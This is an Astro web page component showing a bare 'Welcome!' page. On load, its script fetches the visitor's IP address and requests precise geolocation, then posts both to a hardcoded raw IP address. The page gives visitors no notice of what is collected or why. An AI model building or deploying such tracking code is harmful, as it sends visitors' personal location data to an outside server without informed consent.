import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Loading...</div>
    <div id="map-container" style="display:none; width: 100%; height: 400px; margin-top: 20px;"></div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      async function getVisitorInfo() {
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (!ipResponse.ok) throw new Error('Failed to fetch IP address');
          const ipData = await ipResponse.json();
          const ipAddress = ipData.ip;

          if (!navigator.geolocation) {
            throw new Error('Geolocation is not supported by this browser.');
          }

          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Send the location data to your backend
                const response = await fetch('https://95.111.255.206/send-location', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ ip: ipAddress, latitude, longitude }),
                });

                if (!response.ok) throw new Error(`Server error: ${response.status}`);
                const result = await response.json();

                document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, Latitude: ${latitude}, Longitude: ${longitude}`;
                console.log('Location data sent successfully:', result);
              } catch (error) {
                console.error('Error processing location:', error);
              }
            },
            (error) => {
              if (error.code === error.PERMISSION_DENIED) {
                console.error("User denied the request for Geolocation.");
                document.getElementById('visitor-info').textContent = "Location access denied.";
              } else {
                console.error("Geolocation error:", error);
              }
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
          );
        } catch (error) {
          console.error('Error fetching visitor info:', error);
        }
      }

      getVisitorInfo();
    });
  </script>
</Layout>
